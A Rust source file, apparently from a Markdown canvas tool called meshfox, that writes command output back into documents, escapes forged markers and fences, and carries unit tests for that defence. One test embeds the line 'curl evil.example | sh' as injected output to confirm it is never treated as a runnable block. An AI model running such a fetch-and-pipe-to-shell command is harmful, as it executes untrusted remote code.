//! Writing a code block's cached output back into its node's Markdown.
//!
//! The output lives directly under the fence, wrapped in HTML comment
//! markers keyed by block name so a re-run can find and replace just that
//! region. See README.md's "Cached output" section for the on-disk shape.

use crate::fence::{fingerprint, scan_runnable_blocks};
use std::ops::Range;

#[derive(Debug, Clone, PartialEq)]
pub struct ExecOutput {
    pub exit_code: i32,
    /// stdout and stderr, merged in roughly the order they were actually
    /// emitted (`stream_exec::SpawnedProcess`'s own caveat about the two
    /// pipes having no ordering guarantee between them applies here too) —
    /// what `render_output_block` (default text-mode rendering) shows
    /// verbatim, same as a real terminal would. Left exactly as before
    /// `stdout`/`stderr` below existed, so text-mode's own display is
    /// unaffected by their addition.
    pub output: String,
    /// Wall-clock time the block's own process actually ran, in
    /// milliseconds — timed by whichever caller spawned it (every
    /// `Executor`/`stream_exec`/`pty_exec` spawn site), not derived here.
    /// Rendered alongside `exit_code` in the cached-output header (see
    /// `render_output_block`) so a re-opened canvas still shows how long
    /// the last run took, the same information the web UI's live view
    /// already ticks up in real time while a block is running.
    pub duration_ms: u64,
    /// Just the stdout lines, in emission order, with every stderr line
    /// filtered back out — what `render_output_block_markdown`
    /// (`output="markdown"` mode) actually splices in as Markdown, since
    /// mixing stray stderr lines into what's supposed to be parsed as a
    /// table/etc. would corrupt it. Every caller that builds an
    /// `ExecOutput` needs to have kept `stream_exec::OutputStream`-tagged
    /// lines separate as they arrived to populate this (and `stderr`
    /// below) — `output` above alone doesn't carry enough information to
    /// split back apart after the fact.
    pub stdout: String,
    /// Just the stderr lines, in emission order — see `stdout` above.
    /// Rendered by `render_output_block_markdown` as its own plain-text
    /// block, *before* the Markdown one, regardless of a script's actual
    /// stdout/stderr call order (SPEC.md's "Cached output") — a
    /// `output="markdown"` block's whole point is treating stdout as
    /// structured content to parse, and stderr (warnings, progress,
    /// tracebacks) was never meant to be part of that.
    pub stderr: String,
}

fn start_marker(name: &str, hash: &str) -> String {
    format!("<!-- meshfox:output name=\"{name}\" hash=\"{hash}\" -->")
}

/// Just the `name=`-keyed prefix of `start_marker`, with no `hash=` (which
/// varies run to run) — what an *existing* marker for `block_name` is
/// actually matched against, both to find it for replacement
/// (`write_output`) and to read its stored hash back out
/// (`cached_output_hash`). A plain `starts_with` on this, rather than a
/// full literal match against a freshly-rendered `start_marker`, is what
/// lets a still-current marker (any hash) be found and replaced/read at
/// all — matching on the *new* hash would never find the *old* line.
fn start_marker_prefix(name: &str) -> String {
    format!("<!-- meshfox:output name=\"{name}\"")
}

const END_MARKER: &str = "<!-- /meshfox:output -->";

/// `duration_ms` as a short, human-readable duration — `"842ms"` under a
/// second, `"2.3s"` under a minute, `"1m 05s"` beyond that. Rounds rather
/// than truncates fractional seconds so a genuinely-just-under-a-second run
/// doesn't display as a suspicious `"0.0s"`.
pub fn format_duration_ms(duration_ms: u64) -> String {
    if duration_ms < 1000 {
        return format!("{duration_ms}ms");
    }
    let total_seconds = (duration_ms as f64 / 1000.0).round() as u64;
    if total_seconds < 60 {
        format!("{:.1}s", duration_ms as f64 / 1000.0)
    } else {
        format!("{}m {:02}s", total_seconds / 60, total_seconds % 60)
    }
}

/// A fence length guaranteed to not be closed early by anything in `body`:
/// one longer than the longest run of backticks `body` contains, and never
/// shorter than 3. `body` is a command's captured output, so it can contain
/// literally anything — including a run of backticks as long as (or longer
/// than) a fixed ` ```` ` would be.
fn safe_fence_len(body: &str) -> usize {
    let mut longest_run = 0;
    let mut run = 0;
    for c in body.chars() {
        if c == '`' {
            run += 1;
            longest_run = longest_run.max(run);
        } else {
            run = 0;
        }
    }
    (longest_run + 1).max(3)
}

fn render_output_block(name: &str, output: &ExecOutput, hash: &str) -> String {
    let body = format!(
        "exit code: {} · {}\n\n{}",
        output.exit_code,
        format_duration_ms(output.duration_ms),
        output.output.trim_end()
    );
    let fence = "`".repeat(safe_fence_len(&body));
    format!(
        "{start}\n{fence}text\n{body}\n{fence}\n{end}\n",
        start = start_marker(name, hash),
        end = END_MARKER,
    )
}

/// Neutralizes every literal `<!--` in `s` (`&lt;!--`) so no HTML/
/// `meshfox:*` comment — a canvas node/edge marker, this very region's own
/// `meshfox:output`/`/meshfox:output` delimiters, `meshfox:comment`/`var`/
/// `option` — can be forged by splicing a command's own stdout directly
/// into the document as real Markdown (`output="markdown"`, see
/// `render_output_block_markdown`). Unlike the default text-mode rendering
/// above, this content isn't wrapped in a fence — it's genuinely re-parsed
/// as Markdown/HTML by every downstream reader (this crate's own re-scan,
/// the web UI, static export), so an unescaped forged `<!-- meshfox:node
/// ... -->` here would otherwise become a real, adversarial canvas node —
/// or a forged ` ```bash name="..." cache ` fence (not an HTML comment, so
/// untouched by this escape, but excluded separately — see
/// `output_byte_ranges` and its callers in `candidate_fences`/
/// `scan_constraint_blocks`) a real, adversarial runnable/constraint
/// block — on the very next parse.
fn escape_html_comments(s: &str) -> String {
    s.replace("<!--", "&lt;!--")
}

/// Markdown-mode counterpart of `render_output_block` (opted into per
/// block via the fence's own `output="markdown"` attribute — see
/// `write_output`): the command's stdout (`output.stdout`, *not*
/// `output.output` — see `ExecOutput`'s own doc comments) is spliced in as
/// real Markdown instead of a passive `text` fence, so e.g. a `pandas`
/// `DataFrame` printed via `.to_markdown()` renders as an actual table
/// rather than preformatted text.
///
/// Any stderr (`output.stderr`) prints first, as its own ordinary
/// `​```text​` block — same shape `render_output_block` above always
/// uses, `safe_fence_len`-guarded the same way — regardless of where in
/// the script's own execution order those lines actually landed relative
/// to stdout (`stream_exec`'s two pipes have no ordering guarantee between
/// each other to begin with — see its own `OutputStream` doc comment):
/// stderr is warnings/progress/tracebacks, never itself meant to be parsed
/// as the block's structured Markdown content, so it's kept visually and
/// structurally separate rather than interleaved into it. Escaped the same
/// way stdout is below — not for rendering safety (it's fenced, so inert
/// either way) but so a stray literal `<!-- /meshfox:output -->` in a
/// command's own stderr can't be mistaken by `output_byte_ranges`'s own
/// (non-fence-aware) end-marker search for the real one.
///
/// No `exit code`/duration header on a successful run (nothing to say
/// beyond the content itself, same as a Jupyter `display_data` payload) —
/// only shown, as a leading bold line right before the stdout half, when
/// the block actually failed, since that's the one case the rendered
/// content alone might not make obvious.
fn render_output_block_markdown(name: &str, output: &ExecOutput, hash: &str) -> String {
    let mut body = String::new();
    let stderr_trimmed = output.stderr.trim_end();
    if !stderr_trimmed.is_empty() {
        let escaped = escape_html_comments(stderr_trimmed);
        let fence = "`".repeat(safe_fence_len(&escaped));
        body.push_str(&format!("{fence}text\n{escaped}\n{fence}\n\n"));
    }
    if output.exit_code != 0 {
        body.push_str(&format!(
            "**⚠ exit code: {} · {}**\n\n",
            output.exit_code,
            format_duration_ms(output.duration_ms)
        ));
    }
    body.push_str(&escape_html_comments(output.stdout.trim_end()));
    format!(
        "{start}\n\n{body}\n\n{end}\n",
        start = start_marker(name, hash),
        end = END_MARKER,
    )
}

/// Standard base64 (RFC 4648, with padding). Hand-rolled — the one place
/// `meshfox-core` needs to *encode* anything, not worth a new dependency
/// (`meshfox-cli` has its own `base64` for decoding `data:` URLs).
fn base64_encode(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let n = (u32::from(chunk[0]) << 16)
            | (u32::from(*chunk.get(1).unwrap_or(&0)) << 8)
            | u32::from(*chunk.get(2).unwrap_or(&0));
        out.push(ALPHABET[(n >> 18) as usize & 63] as char);
        out.push(ALPHABET[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 {
            ALPHABET[(n >> 6) as usize & 63] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            ALPHABET[n as usize & 63] as char
        } else {
            '='
        });
    }
    out
}

/// The Markdown image line for an `output="image"` run's stdout —
/// `![name](data:image/svg+xml;base64,…){attrs}` — or `None` when it isn't
/// one: a failed run, or stdout that isn't an SVG. Shared by the cached
/// write (`render_output_block_image`) and the TUI's live view, so both
/// show exactly the same thing. `attrs` is the fence's `output-attrs=`,
/// forwarded in canonical form; an invalid one is left off
/// (`meshfox validate` is what reports it).
pub fn image_output_markdown(
    name: &str,
    stdout: &str,
    exit_code: i32,
    attrs: Option<&str>,
) -> Option<String> {
    let stdout = stdout.trim();
    if exit_code != 0 || !crate::svg::looks_like_svg(stdout) {
        return None;
    }
    // The name is a block identifier, but it lands in link-text position,
    // so neutralize anything that could end the alt text early.
    let alt: String = name
        .chars()
        .filter(|c| !matches!(c, '[' | ']' | '\\' | '\n' | '\r'))
        .collect();
    let braces = attrs
        .and_then(crate::image_attrs::parse_inner)
        .map(|a| a.to_braces())
        .unwrap_or_default();
    Some(format!(
        "![{alt}](data:image/svg+xml;base64,{}){braces}",
        base64_encode(stdout.as_bytes())
    ))
}

/// Image-mode counterpart of `render_output_block`/`render_output_block_
/// markdown` (opted into via the fence's own `output="image"` — see
/// `write_output`): the command's stdout *is* the picture (an SVG, e.g.
/// `plantuml -tsvg -pipe` or `typst compile - -f svg -`), and this wraps it
/// into the one Markdown line every renderer already knows how to show,
/// `![name](data:image/svg+xml;base64,…){attrs}` — the same shape a script
/// would print by hand under `output="markdown"` (see
/// `examples/pandas-dataframe.canvas.md`), minus the base64 boilerplate.
/// `attrs` is the fence's `output-attrs=` (the image-attribute grammar,
/// `crate::image_attrs`), forwarded in canonical form; an invalid one is
/// simply left off here — `meshfox validate` is what reports it.
///
/// The region has the same shape `render_output_block_markdown` writes, so
/// every reader that already understands `output="markdown"` (the web UI's
/// `parseCachedOutputBlockMarkdown`, the TUI's own splice) reads it
/// unchanged: stderr, if any, is its own leading `text` block; a failed run
/// gets the leading bold exit-code line.
///
/// Anything that isn't a successful run printing an SVG shows what the
/// command actually printed — in a plain (info-string-less) fence, never
/// as Markdown and never as a broken image — so a failed renderer's error
/// message, or a tool that printed something else entirely, reads as what
/// it is. (No `text` info string on purpose: a leading ```` ```text ````
/// block is what readers take to be stderr.)
fn render_output_block_image(
    name: &str,
    output: &ExecOutput,
    hash: &str,
    attrs: Option<&str>,
) -> String {
    let mut body = String::new();
    let stderr_trimmed = output.stderr.trim_end();
    if !stderr_trimmed.is_empty() {
        let escaped = escape_html_comments(stderr_trimmed);
        let fence = "`".repeat(safe_fence_len(&escaped));
        body.push_str(&format!("{fence}text\n{escaped}\n{fence}\n\n"));
    }
    if output.exit_code != 0 {
        body.push_str(&format!(
            "**⚠ exit code: {} · {}**\n\n",
            output.exit_code,
            format_duration_ms(output.duration_ms)
        ));
    }
    if let Some(image) = image_output_markdown(name, &output.stdout, output.exit_code, attrs) {
        body.push_str(&image);
    } else if !output.stdout.trim().is_empty() {
        let escaped = escape_html_comments(output.stdout.trim());
        let fence = "`".repeat(safe_fence_len(&escaped));
        body.push_str(&format!("{fence}\n{escaped}\n{fence}"));
    }
    format!(
        "{start}\n\n{body}\n\n{end}\n",
        start = start_marker(name, hash),
        end = END_MARKER,
    )
}

/// Byte ranges of every `<!-- meshfox:output name="..." ... --> ...
/// <!-- /meshfox:output -->` region anywhere in `markdown`. A candidate
/// start match only counts as a real region if it's structurally where
/// `write_output` actually places one: immediately after some real
/// fence's own closing line, at exactly `fence.span.end + 1` (one `\n`,
/// nothing else — see `write_output`'s own insertion, which drops
/// whatever originally followed the fence and writes exactly that byte
/// layout). This is deliberately much stricter than "not inside a fence" —
/// a document can and does mention this exact marker syntax in ordinary
/// prose (this very doc comment, for one) with nothing structurally
/// fenced about it at all; matching on fence-adjacency instead of mere
/// fence-avoidance is what keeps a stray mention from being mistaken for
/// a real region and swallowing everything up to the next accidental
/// `<!-- /meshfox:output -->`-shaped text later in the document — a real,
/// previously-shipped bug this comment is deliberately part of the
/// regression test for (see `output_byte_ranges_ignores_a_bare_mention_
/// in_prose_even_far_from_any_fence` below).
///
/// Two independent callers treat these ranges as opaque: `mdcanvas::scan`
/// (a heading, and any `meshfox:node`/`meshfox:edge` comment, inside one of
/// these ranges is never real canvas structure) and `fence::candidate_fences`
/// /`scan_constraint_blocks` (a fence inside one of these ranges is never a
/// real runnable/constraint block). Both exist so that whatever a command
/// prints, once captured here, can never manufacture real document
/// structure no matter how it's rendered back — plain-text (already safely
/// fenced) or, with `output="markdown"`, spliced in as real Markdown (kept
/// honest by `escape_html_comments` above for the comment half of that, and
/// by this function's own callers for the fence half).
///
/// Relies on a legitimately-written region never containing the literal
/// `<!-- /meshfox:output -->` text partway through — true for text mode
/// (always inside its own single fence) and, for markdown mode, exactly
/// what `escape_html_comments` guarantees at write time.
pub(crate) fn output_byte_ranges(markdown: &str) -> Vec<Range<usize>> {
    const START_PREFIX: &str = "<!-- meshfox:output ";
    let fence_ranges = crate::fence::fenced_byte_ranges(markdown);
    let follows_a_real_fence = |pos: usize| fence_ranges.iter().any(|r| r.end + 1 == pos);

    let mut ranges = Vec::new();
    let mut search_from = 0;
    while let Some(rel) = markdown[search_from..].find(START_PREFIX) {
        let start = search_from + rel;
        if !follows_a_real_fence(start) {
            search_from = start + START_PREFIX.len();
            continue;
        }
        match markdown[start..].find(END_MARKER) {
            Some(rel_end) => {
                let end = start + rel_end + END_MARKER.len();
                ranges.push(start..end);
                search_from = end;
            }
            None => {
                // No matching end marker (malformed/truncated file) --
                // nothing to treat as opaque; keep scanning past just the
                // start marker itself rather than the whole rest of the
                // document.
                search_from = start + START_PREFIX.len();
            }
        }
    }
    ranges
}

/// Remove complete cached-output regions whose preceding source fence no longer
/// enables `cache`. Uses the same structural regions as the canvas parser, so
/// marker examples and fences printed inside output are never treated as source.
/// Reading a document does not call this; workers apply it when saving.
pub fn strip_uncached_output(markdown: &str) -> String {
    let regions = output_byte_ranges(markdown);
    let fences = crate::fence::candidate_fences(markdown);
    let mut result = markdown.to_string();
    for region in regions.iter().rev() {
        let Some((_, _, attrs)) = fences
            .iter()
            .find(|(fence, _, _)| fence.span.end + 1 == region.start)
        else {
            continue;
        };
        if !attrs.get("cache").is_some_and(|value| value != "false") {
            result.replace_range(region.clone(), "");
        }
    }
    result
}

/// Insert or update the cached-output region for the code block named
/// `block_name` in `markdown`. Returns `None` if no runnable block with
/// that name exists. `block_name` doubles as the node-id fallback
/// `scan_runnable_blocks` needs to resolve an implicitly-named lone
/// block — correct because callers always pass the block's already-
/// resolved effective name, which *is* the owning node's id in exactly
/// that case.
///
/// The marker written also carries `crate::fence::fingerprint(block)` —
/// `block` exactly as found here, i.e. the fence *as it stands in
/// `markdown` right now* — so a later reader (`cached_output_hash`) can
/// tell whether the fence has changed since this output was captured
/// without needing any separate session state; see SPEC.md's "Cached
/// output".
///
/// The block's own `output="markdown"`/`output="image"` attribute
/// (`render_output_block_markdown`/`render_output_block_image` vs. the
/// default `render_output_block`) picks how the captured stdout is
/// written back — see SPEC.md's "Cached output".
pub fn write_output(markdown: &str, block_name: &str, output: &ExecOutput) -> Option<String> {
    let blocks = scan_runnable_blocks(block_name, markdown);
    let block = blocks
        .iter()
        .find(|b| b.name.as_deref() == Some(block_name))?;
    let insert_point = block.span.end;
    let hash = fingerprint(block);
    let rendered = match block.attrs.get("output").map(String::as_str) {
        Some("markdown") => render_output_block_markdown(block_name, output, &hash),
        Some("image") => render_output_block_image(
            block_name,
            output,
            &hash,
            block.attrs.get("output-attrs").map(String::as_str),
        ),
        _ => render_output_block(block_name, output, &hash),
    };
    let marker = start_marker_prefix(block_name);

    let after = &markdown[insert_point..];
    let trimmed_after = after.trim_start_matches(['\n', ' ', '\t']);
    let gap = after.len() - trimmed_after.len();

    // Whatever follows the region we're about to write (the rest of the
    // document), starting with the newline that ends the line it sits on:
    // the fence's closing line when there's no region yet, or the old
    // region's `<!-- /meshfox:output -->` line when there is one.
    // `rendered` is written *without* its own trailing newline for exactly
    // that reason — that newline is already the first byte of `rest`, so
    // keeping both added one more blank line after the region on every
    // single re-run.
    let mut rest = after;
    if trimmed_after.starts_with(&marker) {
        if let Some(end_idx) = trimmed_after.find(END_MARKER) {
            let region_end = gap + end_idx + END_MARKER.len();
            rest = &markdown[insert_point + region_end..];
        }
    }

    let mut result = String::with_capacity(markdown.len() + rendered.len());
    result.push_str(&markdown[..insert_point]);
    result.push('\n');
    result.push_str(rendered.trim_end_matches('\n'));
    if !rest.starts_with('\n') {
        result.push('\n');
    }
    result.push_str(rest);
    Some(result)
}

/// Reads back the `hash=` `write_output` embedded in `block_name`'s own
/// cached-output marker, if that block has cached output at all — the
/// counterpart read half of `write_output`'s own write, using the exact
/// same "look for the marker right after the fence's own span" locality
/// (not a whole-document text search, which a command's own captured
/// output could fool the same way `output_containing_backtick_runs_and_
/// headings_round_trips_safely` already guards `write_output` itself
/// against). `None` for a block with no cached output at all, or one
/// cached before this field existed.
pub fn cached_output_hash(markdown: &str, block_name: &str) -> Option<String> {
    let blocks = scan_runnable_blocks(block_name, markdown);
    let block = blocks
        .iter()
        .find(|b| b.name.as_deref() == Some(block_name))?;
    let after = &markdown[block.span.end..];
    let trimmed_after = after.trim_start_matches(['\n', ' ', '\t']);
    let prefix = start_marker_prefix(block_name);
    if !trimmed_after.starts_with(&prefix) {
        return None;
    }
    let line_end = trimmed_after.find("-->")? + "-->".len();
    let marker_line = &trimmed_after[..line_end];
    let inner = marker_line
        .strip_prefix("<!--")?
        .strip_suffix("-->")?
        .trim()
        .strip_prefix("meshfox:output")?;
    crate::attrs::parse_attrs(inner.trim()).remove("hash")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fence::scan_code_blocks;

    fn out(code: i32, s: &str) -> ExecOutput {
        ExecOutput {
            exit_code: code,
            output: s.to_string(),
            duration_ms: 0,
            stdout: s.to_string(),
            stderr: String::new(),
        }
    }

    #[test]
    fn strip_uncached_output_preserves_cached_blocks_and_surrounding_text() {
        let region = "<!-- meshfox:output name=\"demo\" -->\n| a | b |\n<!-- /meshfox:output -->";
        for flag in ["", " cache=false", " cache", " cache=true"] {
            let input =
                format!("before\n```bash name=\"demo\"{flag}\necho 1\n```\n{region}\nafter\n");
            let expected = if flag.is_empty() || flag == " cache=false" {
                input.replace(region, "")
            } else {
                input.clone()
            };
            let actual = strip_uncached_output(&input);
            assert_eq!(actual, expected);
            assert_eq!(strip_uncached_output(&actual), actual);
        }
    }

    #[test]
    fn strip_uncached_output_ignores_examples_and_incomplete_regions() {
        let input = concat!(
            "Mention <!-- meshfox:output name=\"x\" --> in prose.\n",
            "````text\n```bash\necho hi\n```\n",
            "<!-- meshfox:output name=\"x\" -->\nexample\n<!-- /meshfox:output -->\n````\n",
            "```text\nnot runnable\n```\n",
            "<!-- meshfox:output name=\"fake\" -->\nexample\n<!-- /meshfox:output -->\n",
            "```bash name=\"broken\"\necho hi\n```\n",
            "<!-- meshfox:output name=\"broken\" -->\nkeep the rest\n",
        );
        assert_eq!(strip_uncached_output(input), input);
    }

    #[test]
    fn strip_uncached_output_handles_multiple_regions_and_nested_fences() {
        let cached = "```bash name=\"keep\" cache\necho hi\n```\n<!-- meshfox:output name=\"keep\" -->\n```bash name=\"printed\"\necho fake\n```\n<!-- /meshfox:output -->\n";
        let source = "```bash name=\"drop\"\necho hi\n```\n";
        let output =
            "<!-- meshfox:output name=\"drop\" -->\n```text\nhi\n```\n<!-- /meshfox:output -->";
        let input = format!("{source}{output}\n{cached}{source}{output}\n");
        assert_eq!(
            strip_uncached_output(&input),
            format!("{source}\n{cached}{source}\n")
        );
    }

    #[test]
    fn format_duration_ms_under_a_second_is_milliseconds() {
        assert_eq!(format_duration_ms(0), "0ms");
        assert_eq!(format_duration_ms(842), "842ms");
    }

    #[test]
    fn format_duration_ms_under_a_minute_is_one_decimal_seconds() {
        assert_eq!(format_duration_ms(1000), "1.0s");
        assert_eq!(format_duration_ms(2340), "2.3s");
        assert_eq!(format_duration_ms(59_499), "59.5s");
    }

    #[test]
    fn format_duration_ms_right_at_the_minute_boundary_rounds_into_minutes() {
        // 59_999ms rounds to 60 whole seconds, which is no longer < 60 --
        // the boundary check uses the same rounded `total_seconds` the
        // "m/s" branch itself displays, so this is consistent rather than
        // a `"60.0s"` that never actually appears.
        assert_eq!(format_duration_ms(59_999), "1m 00s");
    }

    #[test]
    fn format_duration_ms_a_minute_or_more_is_minutes_and_seconds() {
        assert_eq!(format_duration_ms(60_000), "1m 00s");
        assert_eq!(format_duration_ms(65_000), "1m 05s");
        assert_eq!(format_duration_ms(3_725_000), "62m 05s");
    }

    #[test]
    fn write_output_renders_the_duration_alongside_the_exit_code() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let result = ExecOutput {
            exit_code: 0,
            output: "ok".to_string(),
            duration_ms: 2300,
            stdout: "ok".to_string(),
            stderr: String::new(),
        };
        let updated = write_output(md, "build", &result).unwrap();
        assert!(updated.contains("exit code: 0 · 2.3s"), "{updated}");
    }

    #[test]
    fn inserts_output_when_absent() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let updated = write_output(md, "build", &out(0, "ok")).unwrap();
        assert!(updated.contains("<!-- meshfox:output name=\"build\" hash=\""));
        assert!(updated.contains("exit code: 0"));
        assert!(updated.contains("ok"));
        assert!(updated.contains("<!-- /meshfox:output -->"));
        // the block is still there and still scannable
        let blocks = scan_code_blocks(&updated);
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].name.as_deref(), Some("build"));
    }

    #[test]
    fn replaces_existing_output_in_place() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let first = write_output(md, "build", &out(1, "first run failed")).unwrap();
        let second = write_output(&first, "build", &out(0, "second run ok")).unwrap();

        assert!(!second.contains("first run failed"));
        assert!(second.contains("second run ok"));
        assert!(second.contains("exit code: 0"));
        // exactly one marker pair, not stacked
        assert_eq!(second.matches("meshfox:output name=\"build\"").count(), 1);
    }

    #[test]
    fn leaves_unrelated_content_untouched() {
        let md = "intro\n\n```bash name=\"build\" cache\ncargo build\n```\n\noutro text\n";
        let updated = write_output(md, "build", &out(0, "ok")).unwrap();
        assert!(updated.starts_with("intro\n\n"));
        assert!(updated.trim_end().ends_with("outro text"));
    }

    #[test]
    fn returns_none_for_unknown_block() {
        let md = "```bash name=\"build\"\ncargo build\n```\n";
        assert!(write_output(md, "nope", &out(0, "ok")).is_none());
    }

    #[test]
    fn cached_output_hash_is_none_without_cached_output() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        assert_eq!(cached_output_hash(md, "build"), None);
    }

    #[test]
    fn cached_output_hash_reads_back_what_write_output_wrote() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let updated = write_output(md, "build", &out(0, "ok")).unwrap();
        let block = &scan_code_blocks(&updated)[0];
        assert_eq!(
            cached_output_hash(&updated, "build"),
            Some(crate::fence::fingerprint(block))
        );
    }

    #[test]
    fn cached_output_hash_changes_once_the_fences_own_code_changes() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let updated = write_output(md, "build", &out(0, "ok")).unwrap();
        let stored_hash = cached_output_hash(&updated, "build").unwrap();

        // Simulate an edit to the fence's own code, leaving the cached
        // output region (and its old hash) untouched — same shape a real
        // editor save produces before anything re-runs the block.
        let edited = updated.replacen("cargo build", "cargo build --release", 1);
        let live_block = &scan_code_blocks(&edited)[0];
        assert_ne!(stored_hash, crate::fence::fingerprint(live_block));
        // The stored marker itself is untouched by the edit -- only what
        // it's compared against (the fence's own live fingerprint) moved.
        assert_eq!(cached_output_hash(&edited, "build"), Some(stored_hash));
    }

    #[test]
    fn output_containing_backtick_runs_and_headings_round_trips_safely() {
        // Output from an arbitrary command can contain anything — including
        // text that looks exactly like meshfox's own syntax. The written
        // block must use a fence long enough that none of it can be
        // (mis)read as closing the block early.
        let evil = "# Fake Heading\n```\n````\n`````\n<!-- meshfox:node id=\"fake\" -->";
        let md = "```bash name=\"evil\" cache\necho evil\n```\n";
        let updated = write_output(md, "evil", &out(0, evil)).unwrap();

        // The output block must still be found intact by a re-scan (i.e.
        // the fence wasn't closed early by content inside it), and the
        // evil payload must be fully preserved, backtick runs and all.
        assert!(updated.contains(evil));
        let blocks = scan_code_blocks(&updated);
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].name.as_deref(), Some("evil"));

        // A full canvas parse must not treat the embedded fake heading /
        // meshfox:node comment as real structure.
        let canvas =
            crate::mdcanvas::parse(&format!("# Root\n<!-- meshfox:node -->\n\n{updated}")).unwrap();
        assert_eq!(canvas.nodes.len(), 1);
    }

    #[test]
    fn markdown_mode_splices_output_in_as_real_markdown_with_no_header() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(df.to_markdown())\n```\n";
        let table = "| id | name |\n|---:|:-----|\n|  1 | ann  |";
        let updated = write_output(md, "df", &out(0, table)).unwrap();

        // No passive `text` fence wrapping it -- it's real Markdown now.
        assert!(!updated.contains("```text"));
        assert!(updated.contains(table));
        // A successful run gets no exit-code/duration noise, unlike the
        // default text-mode rendering.
        assert!(!updated.contains("exit code"));
    }

    #[test]
    fn markdown_mode_shows_a_failure_header_on_nonzero_exit() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nraise ValueError()\n```\n";
        let updated = write_output(md, "df", &out(1, "Traceback...")).unwrap();
        assert!(updated.contains("**⚠ exit code: 1"));
        assert!(updated.contains("Traceback..."));
    }

    #[test]
    fn markdown_mode_prints_stderr_as_a_plain_text_block_before_the_markdown_stdout() {
        let md =
            "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\n...\n```\n";
        let table = "| id |\n|---:|\n|  1 |";
        let result = ExecOutput {
            exit_code: 0,
            output: format!("warning: deprecated\n{table}"),
            duration_ms: 0,
            stdout: table.to_string(),
            stderr: "warning: deprecated".to_string(),
        };
        let updated = write_output(md, "df", &result).unwrap();

        // stderr is a passive text fence, stdout is unwrapped Markdown --
        // and stderr comes first, regardless of `output`'s own (merged,
        // unused here) interleaving.
        let stderr_pos = updated.find("```text").unwrap();
        let stderr_line_pos = updated.find("warning: deprecated").unwrap();
        let table_pos = updated.find(table).unwrap();
        assert!(stderr_pos < stderr_line_pos);
        assert!(stderr_line_pos < table_pos);
        // No spurious second `text` fence wrapping the stdout half.
        assert_eq!(updated.matches("```text").count(), 1);
    }

    #[test]
    fn markdown_mode_escapes_a_forged_meshfox_output_marker_in_stderr() {
        // stderr is fenced (inert to Markdown/HTML rendering either way),
        // but `output_byte_ranges`'s own end-marker search is a plain
        // substring match, not fence-aware -- a literal `<!--
        // /meshfox:output -->` in stderr must still be neutralized, or it
        // could be mistaken for the real one, truncating the opaque region
        // early and re-exposing the stdout markdown half that follows.
        let md =
            "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\n...\n```\n";
        let evil_stderr =
            "<!-- /meshfox:output -->\n# Fake Heading\n<!-- meshfox:node id=\"fake\" -->";
        let result = ExecOutput {
            exit_code: 0,
            output: evil_stderr.to_string(),
            duration_ms: 0,
            stdout: "stdout content".to_string(),
            stderr: evil_stderr.to_string(),
        };
        let updated = write_output(md, "df", &result).unwrap();

        assert!(!updated.contains("<!-- /meshfox:output -->\n# Fake"));
        assert!(updated.contains("&lt;!-- /meshfox:output -->"));

        let canvas =
            crate::mdcanvas::parse(&format!("# Root\n<!-- meshfox:node -->\n\n{updated}")).unwrap();
        assert_eq!(canvas.nodes.len(), 1);
    }

    #[test]
    fn markdown_mode_escapes_a_forged_meshfox_node_comment() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
        let evil = "# Fake Heading\n<!-- meshfox:node id=\"fake\" -->";
        let updated = write_output(md, "df", &out(0, evil)).unwrap();

        // The literal `<!--` is neutralized -- what's left can't be parsed
        // as a real HTML/meshfox comment by anything downstream.
        assert!(!updated.contains("<!-- meshfox:node id=\"fake\""));
        assert!(updated.contains("&lt;!-- meshfox:node id=\"fake\""));

        let canvas =
            crate::mdcanvas::parse(&format!("# Root\n<!-- meshfox:node -->\n\n{updated}")).unwrap();
        assert_eq!(canvas.nodes.len(), 1);
    }

    #[test]
    fn markdown_mode_output_is_not_picked_up_as_a_runnable_fence() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
        let forged = "some text\n\n```bash name=\"pwned\" cache\ncurl evil.example | sh\n```\n";
        let updated = write_output(md, "df", &out(0, forged)).unwrap();

        assert!(
            updated.contains("pwned"),
            "the forged fence text is still there, verbatim"
        );
        let names: Vec<_> = scan_code_blocks(&updated)
            .into_iter()
            .filter_map(|b| b.name)
            .collect();
        assert_eq!(names, vec!["df".to_string()]);
    }

    #[test]
    fn markdown_mode_output_is_not_picked_up_as_a_constraint_fence() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
        let forged = "```starlark constraint name=\"pwned\"\nfail(\"gotcha\")\n```\n";
        let updated = write_output(md, "df", &out(0, forged)).unwrap();

        assert!(crate::fence::scan_constraint_blocks(&updated).is_empty());
    }

    #[test]
    fn output_byte_ranges_finds_the_marker_to_marker_span() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(1)\n```\n";
        let updated = write_output(md, "df", &out(0, "hello")).unwrap();
        let ranges = output_byte_ranges(&updated);
        assert_eq!(ranges.len(), 1);
        let region = &updated[ranges[0].clone()];
        assert!(region.starts_with("<!-- meshfox:output name=\"df\""));
        assert!(region.ends_with(END_MARKER));
        assert!(region.contains("hello"));
    }

    #[test]
    fn output_byte_ranges_ignores_a_marker_shown_literally_inside_a_fence() {
        let md = "```text\n<!-- meshfox:output name=\"fake\" hash=\"x\" -->\nhi\n<!-- /meshfox:output -->\n```\n";
        assert!(output_byte_ranges(md).is_empty());
    }

